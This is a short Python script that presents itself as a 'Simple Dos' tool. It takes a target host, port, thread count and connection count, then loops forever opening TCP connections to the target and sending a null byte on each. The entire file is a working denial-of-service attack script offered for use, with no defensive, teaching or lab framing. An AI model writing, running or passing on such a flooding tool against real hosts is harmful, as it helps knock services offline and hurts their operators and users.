import sys
import threading
import os
import socket
import argparse
def parse_arguments():
 global host,threads,connections,port 
 parser = argparse.ArgumentParser(description="Simple Dos")
 parser.add_argument("host", help="Host to dos")
 parser.add_argument("-t",'--threads', help="Number of threads per second")
 parser.add_argument("-c",'--connections', help="Connections per thread")
 parser.add_argument("-p",'--port', help="Port to dos")
 args = parser.parse_args()
 host=args.host
 threads=args.threads
 connections=args.connections
 port=args.port
def main():
 parse_arguments()
 start_dos()
def start_dos():
 print("Starting dos on {0}:{1}".format(host,port))
 packets=0
 while True:
  for o in range(0,int(threads)):
   thread=threading.Thread(target=connect)
   thread.start()
   packets+=1
   print("\n{} packets were sent".format(str(packets)))
   thread.join()
def connect():
 for i in range(0,int(connections)):
  send = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  send.connect((host,int(port)))
  send.send(b'\0');send.close
main()
